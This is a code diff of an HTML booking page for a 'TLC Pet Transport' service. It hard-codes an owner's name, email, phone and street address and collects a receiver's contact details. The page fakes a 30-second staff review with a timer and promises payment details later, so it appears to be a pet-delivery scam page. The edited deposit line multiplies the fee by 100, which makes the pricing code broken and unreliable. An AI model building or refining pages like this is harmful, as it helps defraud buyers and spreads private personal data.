@@ -2,15 +2,15 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>TCL PET TRANSPORT</title>
+<title>TLC PET TRANSPORT</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
 html, body {
     height: 100%;
     margin: 0;
     font-family: Arial, Helvetica, sans-serif;
-    background: linear-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0.1)),
-    url('https://images.unsplash.com/photo-1601758123927-ff52f9d22a9b?auto=format&fit=crop&w=1600&q=80') center/cover no-repeat;
+    background: linear-gradient(rgba(0,0,0,0.05), rgba(0,0,0,0.05)),
+        url('https://images.unsplash.com/photo-1601758123927-ff52f9d22a9b?auto=format&fit=crop&w=1600&q=80') center/cover no-repeat;
 }
 
 .overlay {
@@ -18,10 +18,8 @@ html, body {
     display: flex;
     justify-content: center;
     align-items: center;
-    background: rgba(255,255,255,0.95);
-    padding: 0 20px;
+    padding: 20px;
     box-sizing: border-box;
-    overflow: hidden;
 }
 
 .container {
@@ -30,19 +28,13 @@ html, body {
     background: #fff;
     border-radius: 14px;
     padding: 30px 25px;
+    margin: 15px 0;
     box-shadow: 0 10px 30px rgba(0,0,0,0.25);
-    position: relative;
-    transition: opacity 0.5s ease, transform 0.3s ease, box-shadow 0.3s ease;
-    opacity: 1;
+    text-align: center;
 }
 
-.container.hidden {
-    opacity: 0;
-    pointer-events: none;
-    transform: scale(0.98);
-}
+.container.hidden { display: none; }
 
-.logo{text-align:center}
 .logo img{
     width: 100px;
     height: 100px;
@@ -54,61 +46,47 @@ html, body {
 
 h2{font-size:26px;letter-spacing:1px;margin-bottom:10px;text-align:center}
 h3{text-align:center}
-.section{margin-top:15px;border:1px solid #ddd;border-radius:8px;padding:12px;background:#fafafa}
+.section{margin-top:20px;border-radius:8px;padding:15px 12px;background:#fafafa}
 label{font-weight:bold;display:block;margin-top:10px}
 input,textarea,select{width:100%;padding:10px;margin-top:6px;border-radius:6px;border:1px solid #ccc;font-size:16px}
 input[readonly],textarea[readonly]{background:#eee}
-.actions{display:flex;justify-content:space-between;margin-top:25px}
+
+.actions{
+    display:flex;
+    justify-content: flex-end;
+    gap:15px;
+    flex-wrap: wrap;
+    margin-top:25px;
+}
 
 .action{
-    color:#1a73e8;
     cursor:pointer;
     font-weight:bold;
     transition: transform 0.2s ease, background 0.2s ease;
-    padding: 8px 12px;
-    border-radius: 6px;
+    padding:12px 18px;
+    border-radius:8px;
+    text-align:center;
 }
 
-.action:hover{
-    transform: translateY(-2px);
-    background: rgba(26,115,232,0.1);
+.action.submit{
+    background-color:#1a73e8;
+    color:#fff;
 }
 
-.action:active{
-    transform: translateY(1px);
-    background: rgba(26,115,232,0.2);
+.action.cancel{
+    background-color:#b22222;
+    color:#fff;
 }
 
-/* Submit Button Rectangle Animation */
-.action.submit {
-    background-color: #1a73e8;
-    color: #fff;
-    display: inline-block;
-    width: 150px;
-    text-align: center;
-    border-radius: 8px;
-    transition: transform 0.2s ease, background 0.2s ease;
-    padding: 10px;
-}
-.action.submit:hover {
-    transform: translateY(-3px);
-    background-color: #155ab6;
-}
-.action.submit:active {
-    transform: translateY(1px);
-    background-color: #0d3d80;
-}
+.action:hover{transform: translateY(-2px);}
+.action:active{transform: translateY(1px);}
 
 .center{text-align:center}
 .loader{width:45px;height:45px;border:4px solid #ddd;border-top:4px solid #1a73e8;border-radius:50%;margin:20px auto;animation:spin 1s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
 .email-error{color:red;font-size:12px;margin-top:3px}
 .shake{animation:shake 0.3s;border-color:red}
-@keyframes shake{0%{transform:translateX(0)}25%{transform:translateX(-5px)}50%{transform:translateX(5px)}75%{transform:translateX(-5px)}100%{transform:translateX(0)}}
-
-.progress{display:flex;justify-content:space-between;margin-bottom:20px;font-size:14px}
-.step{flex:1;text-align:center;color:#999}
-.step.active{color:#1a73e8;font-weight:bold}
+@keyframes shake{0%{transform:translateX(0)}25%{transform:translateX(-5px)}50%{translateX(5px)}75%{translateX(-5px)}100%{transform:translateX(0)}}
 </style>
 </head>
 <body>
@@ -125,27 +103,16 @@ input[readonly],textarea[readonly]{background:#eee}
 <div class="logo">
 <img src="https://images.unsplash.com/photo-1558788353-f76d92427f16?auto=format&fit=crop&w=100&q=80" alt="TCL Pet Logo">
 </div>
-<h2>TCL PET TRANSPORT</h2>
-<div class="progress">
-<div class="step active" id="step1">Form</div>
-<div class="step" id="step2">Review</div>
-<div class="step" id="step3">Summary</div>
-<div class="step" id="step4">Submit</div>
-</div>
+<h2>TLC PET TRANSPORT</h2>
 
 <div class="section">
 <h3>Receiver and Owner Form</h3>
 <label>Name</label><input id="owner_name" value="Collins Dave" readonly>
 <label>Email</label><input id="owner_email" value="collinsdave167@gmail.com" readonly>
-<label>Country Code</label>
-<select id="owner_code">
-<option value="+1">🇺🇸 / 🇨🇦 +1</option>
-<option value="+44">🇬🇧 +44</option>
-<option value="+234">🇳🇬 +234</option>
-<option value="other">Other</option>
-</select>
+<label>Country Code</label><input id="owner_code" value="+1" readonly>
 <label>Phone</label><input id="owner_phone" readonly value="+1 503-801-7342">
-<label>Address</label><textarea id="owner_address" readonly>5678 N Camino Seco, Tucson, AZ 85750,OR</textarea>
+<label>Address</label><textarea id="owner_address" readonly>18945 Cherrylawn Street
+Detroit, MI 48221,OR</textarea>
 </div>
 
 <div class="section">
@@ -157,7 +124,7 @@ input[readonly],textarea[readonly]{background:#eee}
 <select id="receiver_code">
 <option value="+1">🇺🇸 / 🇨🇦 +1</option>
 <option value="+44">🇬🇧 +44</option>
-<option value="+234">🇳🇬 +234</option>
+<option value="+33">🇨🇵 +33</option>
 <option value="other">Other</option>
 </select>
 <label>Phone</label><input id="receiver_phone" required>
@@ -176,9 +143,9 @@ input[readonly],textarea[readonly]{background:#eee}
 </div>
 
 <!-- REVIEW -->
-<div class="container hidden" id="review">
+<div class="container" id="review">
 <h3>Please wait</h3>
-<p class="center">TCL Pet Transport review team is reviewing your submission.</p>
+<p class="center">Your submission is currently under review by the TLC Pet Transport review team.</p>
 <div class="loader"></div>
 <div style="width:100%;background:#ddd;border-radius:8px;overflow:hidden;margin-top:10px;">
     <div id="progressBar" style="width:0%;height:8px;background:#1a73e8;"></div>
@@ -186,13 +153,14 @@ input[readonly],textarea[readonly]{background:#eee}
 </div>
 
 <!-- SUMMARY -->
-<div class="container hidden" id="summary">
+<div class="container" id="summary">
 <h3>Transport Details</h3>
 <div class="section">
-<label>Pickup</label><input readonly value="5678 N Camino Seco, Tucson, AZ 85750">
+<label>Pickup</label><input readonly value="18945 Cherrylawn Street
+Detroit, MI 48221">
 <label>Delivery</label><input id="delivery_display" readonly>
-<label>Pickup Date</label><input readonly value="March 2, 2026">
-<label>Delivery Date</label><input readonly value="March 6, 2026">
+<label>Pickup Date</label><input readonly value="March 7, 2026">
+<label>Delivery Date</label><input readonly value="March 10, 2026">
 </div>
 <div class="section">
 <h3>Payment Summary</h3>
@@ -213,28 +181,28 @@ input[readonly],textarea[readonly]{background:#eee}
 </div>
 
 <!-- CONFIRM -->
-<div class="container hidden" id="confirmBox">
+<div class="container" id="confirmBox">
 <h3>Confirm Submission</h3>
 <p class="center">Are you sure you want to submit?</p>
 <div class="actions">
-<span class="action" onclick="cancelSubmit()">No</span>
+<span class="action cancel" onclick="cancelSubmit()">No</span>
 <span class="action submit" onclick="submitForm()">Yes</span>
 </div>
 </div>
 
 <!-- WAIT -->
-<div class="container hidden" id="wait">
+<div class="container" id="wait">
 <h3>Processing Submission</h3>
 <p class="center">Our system is securely processing your booking request.</p>
 <div class="loader"></div>
 </div>
 
 <!-- FINAL -->
-<div class="container hidden" id="final">
+<div class="container" id="final">
 <h3>Thank You</h3>
 <p class="center">
 Your booking form is successfully submitted.<br>
-After reviewing by our team, payment details will be sent to the owner.
+After our team has finalized the review, the payment details will be promptly sent to the owner.
 </p>
 </div>
 
@@ -242,24 +210,27 @@ After reviewing by our team, payment details will be sent to the owner.
 </div>
 
 <script>
-// Generate tracking ID
-function generateTrackingID(){
-    const randomNum = Math.floor(100000 + Math.random()*900000);
-    return 'TCL-' + randomNum;
-}
+// ===== MANUAL TRACKING ID (RESET FACTOR) =====
+const MANUAL_TRACKING_ID = "TCL-284123"; // <-- change this manually to reset the form for new submissions
 
 // TRACK LOCK
 function getTrackingLockKey(){
-    const id = tracking_id.value || "default";
+    const id = MANUAL_TRACKING_ID; // use manual ID as the lock factor
     return "tcl_locked_" + id;
 }
 
 document.addEventListener("DOMContentLoaded", function(){
-    tracking_id.value = generateTrackingID();
+    tracking_id.value = MANUAL_TRACKING_ID; // assign manual tracking ID to the form
     const lockKey = getTrackingLockKey();
+
     if(localStorage.getItem(lockKey)==="true"){
-        formPage.classList.add("hidden");
+        document.querySelectorAll(".container").forEach(c=>c.classList.add("hidden"));
         final.classList.remove("hidden");
+    } else {
+        document.querySelectorAll(".container").forEach(c=>{
+            if(c.id!=="formPage") c.classList.add("hidden");
+        });
+        formPage.classList.remove("hidden");
     }
 });
 
@@ -296,13 +267,13 @@ function validateAndStartReview(){
 
 // PAYMENT CALCULATION
 function calculatePayment(){
-    const distanceMiles=1500;
+    const distanceMiles=360.30;
     const ratePerMile=0.75;
-    const baseFeeVal=400;
-    const insuranceVal=150;
-    const crateVal=120;
-    const healthVal=80;
-    const depositPercent=0.10;
+    const baseFeeVal=128.10;
+    const insuranceVal=48.05;
+    const crateVal=38.44;
+    const healthVal=25.62;
+    const depositPercent=100.00;
     const distanceVal=distanceMiles*ratePerMile;
     const total=baseFeeVal+distanceVal+insuranceVal+crateVal+healthVal;
     const depositVal=total*depositPercent;
@@ -319,8 +290,6 @@ function calculatePayment(){
 
 // START REVIEW
 function startReview(){
-    step1.classList.remove("active");
-    step2.classList.add("active");
     owner_phone_full.value=owner_code.value+' '+owner_phone.value;
     receiver_phone_full.value=receiver_code.value+' '+receiver_phone.value;
     delivery_display.value=receiver_address.value;
@@ -333,7 +302,6 @@ EMAIL: ${receiver_email.value}`;
     formPage.classList.add('hidden');
     review.classList.remove('hidden');
 
-    // Animate progress bar
     const progressBar = document.getElementById('progressBar');
     let width = 0;
     const interval = setInterval(()=>{
@@ -344,8 +312,6 @@ EMAIL: ${receiver_email.value}`;
 
     setTimeout(()=>{
         review.classList.add('hidden');
-        step2.classList.remove("active");
-        step3.classList.add("active");
         summary.classList.remove('hidden');
         calculatePayment();
     },30000);
@@ -353,8 +319,6 @@ EMAIL: ${receiver_email.value}`;
 
 // CONFIRM SUBMIT
 function confirmSubmit(){
-    step3.classList.remove("active");
-    step4.classList.add("active");
     summary.classList.add('hidden');
     confirmBox.classList.remove('hidden');
 }
@@ -365,14 +329,10 @@ function cancelSubmit(){
 
 // FINAL SUBMIT
 function submitForm(){
-    const lockKey=getTrackingLockKey();
-    if(localStorage.getItem(lockKey)==="true") return;
-    localStorage.setItem(lockKey,"true");
-    document.querySelectorAll(".action").forEach(btn=>{
-        btn.style.pointerEvents="none";
-        btn.style.opacity="0.6";
-    });
-    confirmBox.classList.add('hidden');
+    const lockKey = getTrackingLockKey();
+    if(localStorage.getItem(lockKey)==="true") return; // prevent resubmission
+    localStorage.setItem(lockKey,"true"); // lock this manual tracking ID
+    document.querySelectorAll(".container").forEach(c=>c.classList.add("hidden"));
     wait.classList.remove('hidden');
     setTimeout(()=>{
         fetch(mainForm.action,{method:'POST',body:new FormData(mainForm)});
@@ -382,4 +342,4 @@ function submitForm(){
 }
 </script>
 </body>
-    </html>
+                        </html>
